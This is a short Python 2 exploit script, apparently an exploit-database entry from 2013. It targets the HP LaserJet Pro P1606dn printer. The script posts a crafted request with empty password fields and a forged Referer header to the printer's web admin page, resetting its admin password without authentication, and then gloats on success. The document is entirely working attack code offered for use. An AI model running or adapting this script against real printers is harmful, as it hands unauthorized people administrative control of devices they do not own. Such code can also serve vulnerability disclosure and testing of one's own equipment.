# Exploit Title: HP LaserJet Pro P1606dn Webadmin password reset
# Date: 20.05.2013
# Vendor Homepage: http://www8.hp.com/de/de/products/printers/product-detail.html?oid=4110411
# Firmware Date: 20100223
 
import urllib2
 
ip = &#039;192.168.1.2&#039; # Printer IP
 
req = urllib2.Request(&#039;http://&#039;+ip+&#039;/cgi-bin/ip_password_result.htm&#039;, data=&#039;ID_p+184=&ID_p+184=&Apply=%C3%9Cbernehmen&#039;)
req.add_header(&#039;Referer&#039;, &#039;http://&#039;+ip+&#039;/SSI/Auth/ip_password.htm&#039;)
req.add_header(&#039;User-Agent&#039;, &#039;Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1&#039;)
 
f = urllib2.urlopen(req)
if f.getcode() == 200:
    print &#039;Password reset successfully\nHave a nice day ;-)&#039;
else:
    print &#039;Exploit fail :&#039;+f.getcode()

